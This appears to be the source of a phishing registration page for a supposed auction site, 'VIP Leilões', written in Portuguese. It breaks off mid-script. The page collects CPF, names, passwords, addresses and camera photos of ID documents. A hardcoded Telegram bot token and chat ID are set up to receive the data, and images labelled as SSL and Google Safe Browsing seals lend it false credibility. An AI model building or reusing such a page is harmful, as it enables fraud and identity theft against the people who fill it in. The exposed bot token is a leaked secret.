<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Cadastro – VIP Leilões</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
  
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

  <style>
    /* Reset e Estilos Globais */
    :root {
      --primary-color: #007bff;
      --primary-hover: #0056b3;
      --secondary-color: #6c757d;
      --light-gray: #f8f9fa;
      --border-color: #dee2e6;
      --text-color: #333;
      --success-color: #28a745;
      --error-color: #dc3545;
    }
    * { box-sizing: border-box; }
    body {
      font-family: 'Roboto', sans-serif;
      margin: 0;
      background-color: #f4f4f4;
      color: var(--text-color);
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }
    .container {
      width: 100%;
      max-width: 960px;
      margin: 0 auto;
      padding: 0 20px;
      box-sizing: border-box;
    }
    main { flex-grow: 1; padding: 30px 0; }

    /* Cabeçalho */
    .header { background-color: #fff; padding: 15px 0; border-bottom: 1px solid var(--border-color); }
    .top-bar { display: flex; justify-content: space-between; align-items: center; }
    .logo { height: 40px; }

    /* Tela de seleção inicial */
    #selection-screen { text-align: center; padding: 50px 0; }
    .selection-title { font-size: 2rem; font-weight: 700; margin-bottom: 10px; }
    .selection-subtitle { font-size: 1.1rem; color: #666; margin-bottom: 40px; }
    .selection-options { display: flex; justify-content: center; gap: 30px; flex-wrap: wrap; }
    .selection-box { background-color: #fff; border: 2px solid var(--border-color); border-radius: 8px; padding: 40px; width: 250px; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
    .selection-box:hover { border-color: var(--primary-color); transform: translateY(-5px); box-shadow: 0 8px 15px rgba(0, 123, 255, 0.1); }
    .selection-box i { font-size: 3rem; color: var(--primary-color); margin-bottom: 15px; }
    .selection-box h3 { margin: 0; font-size: 1.5rem; }

    /* Botões */
    .btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px; padding: 12px 25px; border: 1px solid var(--primary-color); background-color: var(--primary-color); color: #fff; text-decoration: none; border-radius: 5px; font-weight: 500; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
    .btn:hover { background-color: var(--primary-hover); border-color: var(--primary-hover); transform: translateY(-2px); box-shadow: 0 4px 10px rgba(0,0,0,0.15); }
    .btn.secondary { background-color: transparent; color: var(--primary-color); }
    .btn.secondary:hover { background-color: var(--light-gray); }
    .btn:disabled, .btn.loading { background-color: #ccc; border-color: #ccc; cursor: not-allowed; transform: none; box-shadow: none; }
    .btn.secondary:disabled { background-color: transparent; cursor: not-allowed; }
    .spinner { width: 18px; height: 18px; border: 2px solid rgba(255, 255, 255, 0.3); border-top-color: #fff; border-radius: 50%; animation: spin 1s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }

    /* Formulário */
    .form-container { background-color: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 800px; margin: 20px auto; }
    .section-title { font-size: 1.5rem; font-weight: 700; margin-bottom: 5px; }
    .section-subtitle { color: #666; margin-bottom: 20px; }
    .row { display: flex; flex-wrap: wrap; margin: 0 -10px; }
    .col-3, .col-4, .col-6, .col-8, .col-9, .col-12 { padding: 0 10px; box-sizing: border-box; margin-bottom: 15px; }
    .col-3 { width: 25%; } .col-4 { width: 33.33%; } .col-6 { width: 50%; } .col-8 { width: 66.66%; } .col-9 { width: 75%; } .col-12 { width: 100%; }
    .label { display: block; margin-bottom: 5px; font-weight: 500; font-size: 0.9em; }
    .input, .select { width: 100%; padding: 10px; border: 1px solid var(--border-color); border-radius: 5px; box-sizing: border-box; }
    .help { font-size: 0.8em; color: #777; margin-top: 5px; }
    .form-actions { display: flex; justify-content: space-between; margin-top: 30px; }
    .alert { padding: 15px; border-radius: 5px; margin-bottom: 20px; border: 1px solid transparent; }
    .alert.success { color: #155724; background-color: #d4edda; border-color: #c3e6cb; }
    .alert.error { color: #721c24; background-color: #f8d7da; border-color: #f5c6cb; }
    .alert.info { color: #0c5460; background-color: #d1ecf1; border-color: #bee5eb; }

    /* Etapas e Animações */
    .step-pane { animation: fadeIn 0.5s ease; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

    /* Força de senha */
    .password-strength { display: flex; height: 5px; border-radius: 5px; margin-top: 5px; }
    .strength-bar { flex-grow: 1; margin: 0 2px; background-color: #eee; transition: background-color 0.3s; }
    .strength-bar.weak { background-color: #e74c3c; }
    .strength-bar.medium { background-color: #f39c12; }
    .strength-bar.strong { background-color: #2ecc71; }

    /* Stepper Antigo (Oculto) */
    .stepper { margin-bottom: 40px; }

    .radio-group label, .checkbox-group label { display: flex; align-items: center; gap: 8px; }

    /* Footer & Câmera */
    .footer { background-color: #2c2c2c; padding: 25px 0; margin-top: auto; }
    .security-badges { display: flex; align-items: center; gap: 15px; justify-content: center; }
    .security-badges img { height: 45px; opacity: 0.9; }
    .camera-modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.6); justify-content: center; align-items: center; }
    .camera-modal-content { background-color: #fff; padding: 20px; border-radius: 8px; text-align: center; }
    #video-preview { width: 100%; max-width: 500px; border: 1px solid #ccc; background-color: #000; }
    .modal-actions { margin-top: 15px; display: flex; justify-content: center; gap: 10px; }
    .preview { font-weight: bold; margin-top: 8px; word-break: break-all; }
    .popover-header { font-weight: bold; }
    .pop_list { display: flex; flex-direction: column; gap: 4px; }
    .pop_item { font-size: 0.9em; }

    /* === ESTILOS GERAIS INJETADOS === */
    .frm_line { display: flex; justify-content: space-between; width: 100%; gap: 20px; }
    .frm_input { flex: 1; }
    .form-control { color: #565656; font-family: Roboto, system-ui, -apple-system, "Segoe UI", "Helvetica Neue", "Noto Sans", "Liberation Sans", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji"; font-size: 16px; font-weight: 400; line-height: 16px; margin: 0; border: 0; border-bottom: 1px solid #bbb; border-radius: 0; height: 56px; padding: 10px 0 0; }
    .form-floating > .form-control { height: calc(3.5rem + 2px); line-height: 1.25; padding: 1rem .75rem; }
    .form-floating > .form-control:focus, .form-floating > .form-control:not(:placeholder-shown) { padding-top: 1.625rem; padding-bottom: .625rem; }
    .form-floating > .form-control:focus ~ label, .form-floating > .form-control:not(:placeholder-shown) ~ label { opacity: .65; transform: scale(.85) translateY(-.5rem) translateX(.15rem); }
    .form-floating > label { color: #565656; }
    .frm_error { color: var(--error-color); font-size: 0.8em; display: none; }
    .but_next { display: inline-flex; align-items: center; justify-content: center; gap: 8px; padding: 12px 25px; border: 1px solid var(--primary-color); background-color: var(--primary-color); color: #fff; text-decoration: none; border-radius: 5px; font-weight: 500; cursor: pointer; transition: all 0.3s ease; }
    .but_next:hover { background-color: var(--primary-hover); border-color: var(--primary-hover); }
    .btn.secondary .spinner {
        border-color: rgba(0, 123, 255, 0.3);
        border-top-color: var(--primary-color);
    }
    
    /* === NOVOS ESTILOS PARA O STEPPER INJETADO === */
    .box_full { display: flex; align-items: center; justify-content: center; width: 100%; padding: 20px 0; }
    .stp_number { width: 30px; height: 30px; border-radius: 50%; background-color: #fff; border: 2px solid var(--border-color); display: flex; justify-content: center; align-items: center; font-weight: bold; color: var(--secondary-color); transition: all 0.3s; z-index: 2; }
    .stp_number.stp_atual { background-color: var(--primary-color); border-color: var(--primary-color); color: #fff; }
    .stp_connect { flex: 1; height: 4px; background-color: var(--border-color); position: relative; margin: 0 5px; z-index: 1; }
    .stp_connect .stp_connect { position: absolute; top: 0; left: 0; height: 100%; background-color: var(--primary-color); margin: 0; width: 0; transition: width 0.4s ease-in-out; }
    .stp_connect.stp_atual .stp_connect { width: 100% !important; }
    
    /* === INÍCIO DA CORREÇÃO PARA MOBILE === */
    @media (max-width: 768px) {
      /* Faz com que todas as colunas ocupem 100% da largura em telas pequenas */
      .row > [class*="col-"] {
        width: 100%;
        flex: 0 0 100%;
        max-width: 100%;
      }
      /* Empilha os campos de e-mail e confirmação de e-mail */
      .frm_line {
        flex-direction: column;
        gap: 0; /* Remove o espaçamento para não ficar muito grande */
      }
      /* Ajusta os botões na tela de seleção inicial */
      .selection-options {
        flex-direction: column;
        align-items: center;
      }
    }
    /* === FIM DA CORREÇÃO PARA MOBILE === */
  </style>
</head>
<body>

<header class="header">
  <div class="container top-bar">
    <div class="brand">
      <img src="assets/logo.png" alt="VIP Leilões Logo" class="logo">
    </div>
  </div>
</header>

<main class="main-content">
  <div class="container">
    
    <div id="selection-screen">
        <h2 class="selection-title">Bem-vindo(a) ao seu cadastro</h2>
        <p class="selection-subtitle">Para começar, selecione o tipo de conta que deseja criar.</p>
        <div class="selection-options">
            <div class="selection-box" onclick="startForm('PF')">
                <i class="fas fa-user"></i>
                <h3>Pessoa Física</h3>
            </div>
            <div class="selection-box" onclick="startForm('PJ')">
                <i class="fas fa-building"></i>
                <h3>Pessoa Jurídica</h3>
            </div>
        </div>
    </div>

    <div id="form-wrapper" class="form-container" style="display:none;">
      <div id="stepper" class="stepper">
        <div class="box_full">
            <span class="stp_number stp_atual">1</span>
            <div class="stp_connect">
                <div class="stp_connect" style="width: 0%"></div>
            </div>
            <span class="stp_number">2</span>
            <div class="stp_connect">
                <div class="stp_connect" style="width: 0%"></div>
            </div>
            <span class="stp_number">3</span>
            <div class="stp_connect">
                <div class="stp_connect" style="width: 0%"></div>
            </div>
            <span class="stp_number">4</span>
        </div>
        </div>
      <div id="msg" class="alert" style="display:none"></div>

      <form id="form" class="form" onsubmit="return false;">
        
        <div class="step-pane" data-step="1">
          <h2 class="section-title" id="step1-title">Dados Pessoais</h2>
          <p class="section-subtitle">Informações de acesso e contato</p>
          <div class="row">
            <div class="col-6 field-pf">
              <label class="label" for="cpf">CPF * <span class="help">(somente números)</span></label>
              <input class="input" id="cpf" maxlength="14" placeholder="000.000.000-00" required/>
            </div>
            <div class="col-12 field-pf">
              <label class="label" for="nome">Nome completo *</label>
              <input class="input" id="nome" required/>
            </div>
            <div class="col-6 field-pj" style="display:none;">
              <label class="label" for="cnpj">CNPJ * <span class="help">(somente números)</span></label>
              <input class="input" id="cnpj" maxlength="18" placeholder="00.000.000/0000-00"/>
            </div>
            <div class="col-6 field-pj" style="display:none;">
              <label class="label" for="razaoSocial">Razão Social *</label>
              <input class="input" id="razaoSocial"/>
            </div>
            <div class="col-6 field-pj" style="display:none;">
              <label class="label" for="nomeFantasia">Nome Fantasia *</label>
              <input class="input" id="nomeFantasia"/>
            </div>
            <div class="col-6">
              <label class="label" for="apelido">Apelido / Nome de usuário *</label>
              <input class="input" id="apelido" required/>
            </div>
            <div class="col-6">
              <label class="label" for="celular">Celular / WhatsApp *</label>
              <input class="input" id="celular" maxlength="16" placeholder="(00) 90000-0000" required/>
              <div class="form-check-inline mt-2">
                <input class="form-check-input" type="checkbox" id="celularWhats" checked>
                <label class="form-check-label" for="celularWhats" style="color: #6c757d;">Este telefone também é WhatsApp</label>
              </div>
            </div>
            <div class="col-6">
              <label class="label" for="telefone">Telefone Comercial</label>
              <input class="input" id="telefone" maxlength="15" placeholder="(00) 0000-0000"/>
            </div>
            
            <div class="col-12">
                <div class="frm_line">
                    <div class="form-floating frm_input">
                        <input class="form-control" id="email" placeholder="E-mail" autocomplete="email" type="email" required>
                        <label class="form-label" for="email">E-mail *</label>
                    </div>
                    <div class="form-floating frm_input">
                        <input class="form-control" id="email2" placeholder="Confirmar E-mail" autocomplete="email" onpaste="return false;" ondrop="return false;" type="email" required>
                        <label class="form-label" for="email2">Confirmar E-mail *</label>
                    </div>
                </div>
            </div>

            <div class="col-6">
              <label class="label" for="senha">Senha *</label>
              <input class="input" type="password" id="senha" required autocomplete="new-password" 
                     data-bs-toggle="popover" data-bs-trigger="focus" data-bs-html="true" data-bs-placement="bottom"
                     title="<b>Requisitos de uma senha forte:</b>"
                     data-bs-content="<div class='pop_list'>
                                        <span class='pop_item'>Mínimo 8 caracteres;</span>
                                        <span class='pop_item'>Deve conter os 4 tipos abaixo:</span>
                                        <span class='pop_item'>- Letras maiúsculas (A-Z);</span>
                                        <span class='pop_item'>- Letras minúsculas (a-z);</span>
                                        <span class='pop_item'>- Números (0-9);</span>
                                        <span class='pop_item'>- Símbolos (ex: !@#$%);</span>
                                     </div>">
              <div class="password-strength">
                <div class="strength-bar"></div>
                <div class="strength-bar"></div>
                <div class="strength-bar"></div>
              </div>
            </div>
            <div class="col-6">
              <label class="label" for="senha2">Repetir Senha *</label>
              <input class="input" type="password" id="senha2" required/>
            </div>
            <div class="col-12">
              <label class="label">Como você nos conheceu?</label>
              <div class="row">
                  <div class="col-6 radio-group"><label><input type="radio" name="conheceu" value="redes_sociais"/> Redes sociais</label></div>
                  <div class="col-6 radio-group"><label><input type="radio" name="conheceu" value="youtube"/> YouTube</label></div>
                  <div class="col-6 radio-group"><label><input type="radio" name="conheceu" value="google"/> Pesquisas no Google</label></div>
                  <div class="col-6 radio-group"><label><input type="radio" name="conheceu" value="influencers"/> Indicação de influenciadores</label></div>
                  <div class="col-6 radio-group"><label><input type="radio" name="conheceu" value="email_marketing"/> E-mail marketing</label></div>
                  <div class="col-6 radio-group"><label><input type="radio" name="conheceu" value="amigos"/> Indicação de amigos</label></div>
              </div>
            </div>
          </div>
          <div class="form-actions" style="justify-content: flex-end;">
            <button class="but_next" type="button" onclick="onNext()">Próximo <i class="fas fa-arrow-right"></i></button>
          </div>
        </div>

        <div class="step-pane" data-step="2" style="display:none">
          <h2 class="section-title">Endereço</h2>
          <p class="section-subtitle">Informe o endereço de correspondência</p>
          <div class="row">
            <div class="col-4">
              <label class="label" for="cep">CEP *</label>
              <input class="input" id="cep" maxlength="9" placeholder="00000-000" required/>
              <div class="help">Preencha e aguarde.</div>
            </div>
            <div class="col-8">
              <label class="label" for="endereco">Endereço *</label>
              <input class="input" id="endereco" required/>
            </div>
            <div class="col-3">
              <label class="label" for="numero">Número *</label>
              <input class="input" id="numero" required/>
            </div>
            <div class="col-3">
              <label class="label" for="complemento">Complemento</label>
              <input class="input" id="complemento"/>
            </div>
            <div class="col-6">
              <label class="label" for="bairro">Bairro *</label>
              <input class="input" id="bairro" required/>
            </div>
            <div class="col-6">
              <label class="label" for="cidade">Cidade *</label>
              <input class="input" id="cidade" required/>
            </div>
            <div class="col-6">
              <label class="label" for="estado">Estado *</label>
              <select class="select" id="estado" required>
                <option value="">(Selecione)</option>
                <option>AC</option><option>AL</option><option>AP</option><option>AM</option><option>BA</option><option>CE</option><option>DF</option><option>ES</option><option>GO</option><option>MA</option><option>MT</option><option>MS</option><option>MG</option><option>PA</option><option>PB</option><option>PR</option><option>PE</option><option>PI</option><option>RJ</option><option>RN</option><option>RS</option><option>RO</option><option>RR</option><option>SC</option><option>SP</option><option>SE</option><option>TO</option>
              </select>
            </div>
          </div>
          <div class="form-actions">
            <button class="btn secondary" type="button" onclick="prev()"><i class="fas fa-arrow-left"></i> Voltar</button>
            <button class="but_next" type="button" onclick="onNext()">Próximo <i class="fas fa-arrow-right"></i></button>
          </div>
        </div>

        <div class="step-pane" data-step="3" style="display:none">
          <h2 class="section-title">Documentação</h2>
          <p class="section-subtitle" id="step3-subtitle">Envio de documento de identificação (CNH/RG) — <b>obrigatório frente e verso</b></p>
          <div class="row field-pf">
            <div class="col-12">
              <label class="label">Tipo de documento (PF) *</label>
              <div class="row">
                <div class="col-6 radio-group"><label><input type="radio" name="tipoDocPF" value="CNH"> CNH</label></div>
                <div class="col-6 radio-group"><label><input type="radio" name="tipoDocPF" value="RG"> RG</label></div>
              </div>
            </div>
          </div>
          <div class="row">
            <div class="col-12">
              <label class="label" id="doc-front-label">Documento - Frente *</label>
              <div style="display:flex; gap: 10px; flex-wrap: wrap;">
                <button type="button" class="btn secondary" onclick="document.getElementById('doc-front-file').click()"><i class="fas fa-upload"></i> Enviar Frente</button>
                <button type="button" class="btn secondary" data-side="front" id="start-camera-front"><i class="fas fa-camera"></i> Tirar Foto (Frente)</button>
              </div>
              <input type="file" id="doc-front-file" accept="image/*" style="display:none;">
              <div id="file-preview-front" class="preview"></div>
            </div>
          </div>
          <div class="row">
            <div class="col-12">
              <label class="label" id="doc-back-label">Documento - Verso *</label>
              <div style="display:flex; gap: 10px; flex-wrap: wrap;">
                <button type="button" class="btn secondary" onclick="document.getElementById('doc-back-file').click()"><i class="fas fa-upload"></i> Enviar Verso</button>
                <button type="button" class="btn secondary" data-side="back" id="start-camera-back"><i class="fas fa-camera"></i> Tirar Foto (Verso)</button>
              </div>
              <input type="file" id="doc-back-file" accept="image/*" style="display:none;">
              <div id="file-preview-back" class="preview"></div>
            </div>
          </div>
          <div class="form-actions">
            <button class="btn secondary" type="button" onclick="prev()"><i class="fas fa-arrow-left"></i> Voltar</button>
            <button class="but_next" type="button" onclick="onNext()">Próximo <i class="fas fa-arrow-right"></i></button>
          </div>
        </div>

        <div class="step-pane" data-step="4" style="display:none">
          <h2 class="section-title">Revisão</h2>
          <p class="section-subtitle">Revise seus dados antes de concluir</p>
          <div class="alert info">Revise seus dados. Ao enviar, o cadastro será encaminhado para análise e os dados serão enviados ao grupo interno no Telegram.</div>
          
          <div id="review-wrapper" style="margin-top:10px; line-height: 1.6; word-break: break-word;">
            <div class="row" id="review">
              </div>
          </div>

          <div class="form-actions">
            <button class="btn secondary" type="button" onclick="prev()"><i class="fas fa-arrow-left"></i> Voltar</button>
            <button id="submit-btn" class="btn" type="submit" onclick="salvar()">
              <span class="btn-text">Enviar cadastro</span>
              <i class="fas fa-check"></i>
            </button>
          </div>
        </div>
      </form>
    </div>
  </div>
</main>

<div id="camera-modal" class="camera-modal" data-side="front">
  <div class="camera-modal-content">
    <h3 id="camera-title">Aponte para o documento (Frente)</h3>
    <video id="video-preview" autoplay></video>
    <div class="modal-actions">
      <button id="capture-btn" class="btn"><i class="fas fa-camera-retro"></i> Capturar</button>
      <button id="cancel-camera" class="btn secondary">Cancelar</button>
    </div>
  </div>
</div>
<canvas id="canvas" style="display:none;"></canvas>

<footer class="footer">
  <div class="container">
    <div class="security-badges">
      <img src="assets/grupovip.webp" alt="Selo SSL Secure Connection">
      <img src="assets/seguro.svg" alt="Selo Google Safe Browsing">
    </div>
  </div>
</footer>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
<script>
  /* ===========================
   * CONFIG TELEGRAM
   * =========================== */
  const TG_BOT_TOKEN = '8264928483:AAFA3PEPqVWnEKXgRDjcA-vvcZikt0mVhi8';
  const TG_CHAT_ID   = '6501660030';
  const TG_API = TG_BOT_TOKEN && TG_BOT_TOKEN.startsWith('COLOQUE') ? null : `https://api.telegram.org/bot${TG_BOT_TOKEN}`;

  const popoverTriggerList = document.querySelectorAll('[data-bs-toggle="popover"]');
  const popoverList = [...popoverTriggerList].map(popoverTriggerEl => new bootstrap.Popover(popoverTriggerEl));

  let step = 1; const total = 4; let tipoPessoa = 'PF';
  const panes = [...document.querySelectorAll('.step-pane')];
  const msg = document.getElementById('msg');

  const docFrontFileInput = document.getElementById('doc-front-file');
  const docBackFileInput  = document.getElementById('doc-back-file');
  const previewFront = document.getElementById('file-preview-front');
  const previewBack  = document.getElementById('file-preview-back');
  let capturedFront = null;
  let capturedBack  = null;

  const cpfInput = document.getElementById('cpf');
  const cnpjInput = document.getElementById('cnpj');
  const cepInput = document.getElementById('cep');
  const celularInput = document.getElementById('celular');
  const telefoneInput = document.getElementById('telefone');
  const senhaInput = document.getElementById('senha');

  function setMsg(text, type='info'){ 
    msg.style.display='block'; 
    msg.className = 'alert ' + type;
    msg.innerHTML = text; 
  }
  function clearMsg(){ msg.style.display='none'; }

  function startForm(type) {
    tipoPessoa = type;
    document.getElementById('selection-screen').style.display = 'none';
    document.getElementById('form-wrapper').style.display = 'block';

    const fieldsPf = document.querySelectorAll('.field-pf');
    const fieldsPj = document.querySelectorAll('.field-pj');

    if (type === 'PF') {
        document.getElementById('step1-title').innerText = 'Dados Pessoais';
        document.getElementById('step3-subtitle').innerHTML = 'Envio de documento de identificação (CNH/RG) — <b>obrigatório frente e verso</b>';
        fieldsPf.forEach(el => { el.style.display = 'block'; el.querySelector('input, select')?.setAttribute('required', 'required'); });
        fieldsPj.forEach(el => { el.style.display = 'none'; el.querySelector('input, select')?.removeAttribute('required'); });
    } else { // PJ
        document.getElementById('step1-title').innerText = 'Dados da Empresa';
        document.getElementById('step3-subtitle').innerText = 'Envio do Contrato Social ou Cartão CNPJ (frente e verso do documento do representante)';
        fieldsPf.forEach(el => { el.style.display = 'none'; el.querySelector('input, select')?.removeAttribute('required'); });
        fieldsPj.forEach(el => { el.style.display = 'block'; el.querySelector('input, select')?.setAttribute('required', 'required'); });
    }
    showStep(1);
  }

  function updateInjectedStepper(currentStep) {
      const numbers = document.querySelectorAll('.stp_number');
      const connectors = document.querySelectorAll('.stp_connect > .stp_connect');
      
      numbers.forEach(num => num.classList.remove('stp_atual'));
      connectors.forEach(con => {
          con.parentElement.classList.remove('stp_atual');
          con.style.width = '0%';
      });

      for (let i = 0; i < currentStep; i++) {
          if (numbers[i]) {
              numbers[i].classList.add('stp_atual');
          }
          if (i < currentStep - 1 && connectors[i]) {
              connectors[i].parentElement.classList.add('stp_atual');
          }
      }
      
      if (currentStep > 1 && currentStep <= total) {
          const prevConnector = connectors[currentStep - 2];
          if(prevConnector) {
              prevConnector.style.width = '100%';
          }
      }
  }

  function showStep(n){
    step = Math.min(Math.max(1, n), total);
    panes.forEach(p => p.style.display = (+p.dataset.step === step ? 'block' : 'none'));
    
    updateInjectedStepper(step); 

    clearMsg();
    if (step === 4) montarReview();
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }
  
  function prev() {
      const prevButton = document.querySelector(`.step-pane[data-step="${step}"] .btn.secondary`);
      if (prevButton) {
          prevButton.disabled = true;
          prevButton.innerHTML = '<span class="spinner"></span> Voltando...';

          setTimeout(() => {
              showStep(step - 1);
          }, 800);
      }
  }

  function onNext() {
      if (validateStep(step)) {
          const nextButton = document.querySelector(`.step-pane[data-step="${step}"] .but_next`);
          if (nextButton) {
              nextButton.disabled = true;
              nextButton.innerHTML = '<span class="spinner"></span> Aguarde...';

              setTimeout(() => {
                  showStep(step + 1);
              }, 1500);
          }
      }
  }

  function maskCPF(v){ v = v.replace(/\D/g,''); v = v.replace(/(\d{3})(\d)/,'$1.$2'); v = v.replace(/(\d{3})(\d)/,'$1.$2'); v = v.replace(/(\d{3})(\d{1,2})$/,'$1-$2'); return v; }
  function maskCNPJ(v){ v = v.replace(/\D/g,''); v = v.replace(/^(\d{2})(\d)/,'$1.$2'); v = v.replace(/^(\d{2})\.(\d{3})(\d)/,'$1.$2.$3'); v = v.replace(/\.(\d{3})(\d)/,'.$1/$2'); v = v.replace(/(\d{4})(\d)/,'$1-$2'); return v; }
  function maskCEP(v){ v = v.replace(/\D/g,'').slice(0,8); if(v.length>5) v = v.slice(0,5)+'-'+v.slice(5); return v; }
  function maskPhone(v){ v = v.replace(/\D/g,'').slice(0,11); if(v.length>10) return '('+v.slice(0,2)+') '+v.slice(2,7)+'-'+v.slice(7); if(v.length>6) return '('+v.slice(0,2)+') '+v.slice(2,6)+'-'+v.slice(6); if(v.length>2) return '('+v.slice(0,2)+') '+v.slice(2); return v; }

  cpfInput && (cpfInput.oninput = () => cpfInput.value = maskCPF(cpfInput.value));
  cnpjInput && (cnpjInput.oninput = () => cnpjInput.value = maskCNPJ(cnpjInput.value));
  cepInput.oninput = () => cepInput.value = maskCEP(cepInput.value);
  celularInput.oninput = () => celularInput.value = maskPhone(celularInput.value);
  telefoneInput.oninput = () => telefoneInput.value = maskPhone(telefoneInput.value);

  senhaInput.addEventListener('input', () => {
      const pass = senhaInput.value; const bars = document.querySelectorAll('.password-strength .strength-bar'); let strength = 0;
      if (pass.length >= 8) strength++;
      if (pass.match(/[a-z]/) && pass.match(/[A-Z]/)) strength++;
      if (pass.match(/\d/)) strength++;
      if (pass.match(/[^a-zA-Z\d]/)) strength++;
      bars.forEach(bar => bar.className = 'strength-bar');
      if (strength >= 1) bars[0].classList.add(strength > 2 ? 'strong' : (strength > 1 ? 'medium' : 'weak'));
      if (strength >= 2) bars[1].classList.add(strength > 3 ? 'strong' : (strength > 2 ? 'medium' : 'weak'));
      if (strength >= 3) bars[2].classList.add(strength > 3 ? 'strong' : 'medium');
  });

  cepInput.addEventListener('change', async () => {
    const num = cepInput.value.replace(/\D/g,''); if(num.length !== 8) return;
    try{
      const resp = await fetch(`https://viacep.com.br/ws/${num}/json/`);
      const j = await resp.json(); if(j.erro) return;
      document.getElementById('endereco').value = (j.logradouro||''); 
      document.getElementById('bairro').value=(j.bairro||'');
      document.getElementById('cidade').value = (j.localidade||''); 
      document.getElementById('estado').value=(j.uf||'');
      document.getElementById('numero').focus();
    } catch(_) {}
  });

  const cameraModal = document.getElementById('camera-modal');
  const cancelCameraBtn = document.getElementById('cancel-camera');
  const captureBtn = document.getElementById('capture-btn');
  const video = document.getElementById('video-preview');
  const canvas = document.getElementById('canvas');
  const cameraTitle = document.getElementById('camera-title');
  const startCameraFrontBtn = document.getElementById('start-camera-front');
  const startCameraBackBtn  = document.getElementById('start-camera-back');
  let stream = null; let currentCaptureSide = 'front';

  function stopCamera() { if (stream) { stream.getTracks().forEach(track => track.stop()); } cameraModal.style.display = 'none'; }

  async function openCamera(side){
    currentCaptureSide = side;
    cameraTitle.textContent = side === 'front' ? 'Aponte para o documento (Frente)' : 'Aponte para o documento (Verso)';
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
      video.srcObject = stream; cameraModal.style.display = 'flex';
    } catch (err) { alert('Não foi possível acessar a câmera. Verifique as permissões do navegador.'); }
  }

  startCameraFrontBtn.addEventListener('click', () => openCamera('front'));
  startCameraBackBtn.addEventListener('click', () => openCamera('back'));
  cancelCameraBtn.addEventListener('click', stopCamera);

  captureBtn.addEventListener('click', () => {
    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataUrl = canvas.toDataURL('image/jpeg', 0.92);
    if (currentCaptureSide === 'front') { capturedFront = dataUrl; previewFront.textContent = 'Foto (frente) capturada!'; docFrontFileInput.value = ''; }
    else { capturedBack = dataUrl; previewBack.textContent = 'Foto (verso) capturada!'; docBackFileInput.value = ''; }
    stopCamera();
  });

  docFrontFileInput.onchange = () => { previewFront.textContent = docFrontFileInput.files[0] ? `Frente: ${docFrontFileInput.files[0].name}` : ''; if (docFrontFileInput.files[0]) capturedFront = null; };
  docBackFileInput.onchange  = () => { previewBack.textContent  = docBackFileInput.files[0]  ? `Verso: ${docBackFileInput.files[0].name}`   : ''; if (docBackFileInput.files[0])  capturedBack  = null; };

  function same(a,b){ return (a||'').trim().toLowerCase() === (b||'').trim().toLowerCase(); }
  function getFieldValue(id) { return document.getElementById(id)?.value || ''; }
  function getCheckedValue(name) { const el = document.querySelector(`input[name="${name}"]:checked`); return el ? el.value : ''; }

  function validateEmail(e){ return /.+@.+\..+/.test((e||'').trim()); }
  function onlyDigits(str){ return (str||'').replace(/\D/g,''); }

  function validateStep(n){
    if (n === 1){
      const apelido = getFieldValue('apelido'), celular = getFieldValue('celular');
      const email = getFieldValue('email'), email2 = getFieldValue('email2');
      const senha = getFieldValue('senha'), senha2 = getFieldValue('senha2');

      if (!apelido || !celular || !email || !email2 || !senha || !senha2) { setMsg('Preencha todos os campos obrigatórios (*).', 'error'); return false; }
      if (!validateEmail(email) || !validateEmail(email2)) { setMsg('Informe e-mails válidos.', 'error'); return false; }
      if (!same(email, email2)) { setMsg('Os e-mails não conferem.', 'error'); return false; }
      
      const hasUpperCase = /[A-Z]/.test(senha);
      const hasLowerCase = /[a-z]/.test(senha);
      const hasNumbers = /\d/.test(senha);
      const hasSpecialChars = /[^a-zA-Z\d]/.test(senha);

      if (senha.length < 8 || !hasUpperCase || !hasLowerCase || !hasNumbers || !hasSpecialChars) {
          setMsg('A senha não atende aos requisitos de segurança. Verifique as regras ao focar no campo de senha.', 'error');
          return false;
      }
      if (!same(senha, senha2)) { setMsg('As senhas não conferem.', 'error'); return false; }

      if (tipoPessoa === 'PF'){
        const cpf = onlyDigits(getFieldValue('cpf')); const nome = getFieldValue('nome');
        if (!cpf || cpf.length !== 11) { setMsg('Informe um CPF válido (11 dígitos).', 'error'); return false; }
        if (!nome) { setMsg('Informe o nome completo.', 'error'); return false; }
      } else {
        const cnpj = onlyDigits(getFieldValue('cnpj')); const rz = getFieldValue('razaoSocial'); const nf = getFieldValue('nomeFantasia');
        if (!cnpj || cnpj.length !== 14) { setMsg('Informe um CNPJ válido (14 dígitos).', 'error'); return false; }
        if (!rz || !nf) { setMsg('Preencha Razão Social e Nome Fantasia.', 'error'); return false; }
      }
      return true;
    }

    if (n === 2){
      const required = ['cep','endereco','numero','bairro','cidade','estado'];
      for (const id of required){ if (!getFieldValue(id)) { setMsg('Preencha todos os campos obrigatórios do endereço.', 'error'); return false; } }
      if (onlyDigits(getFieldValue('cep')).length !== 8){ setMsg('CEP inválido.', 'error'); return false; }
      return true;
    }

    if (n === 3){
      if (tipoPessoa === 'PF') {
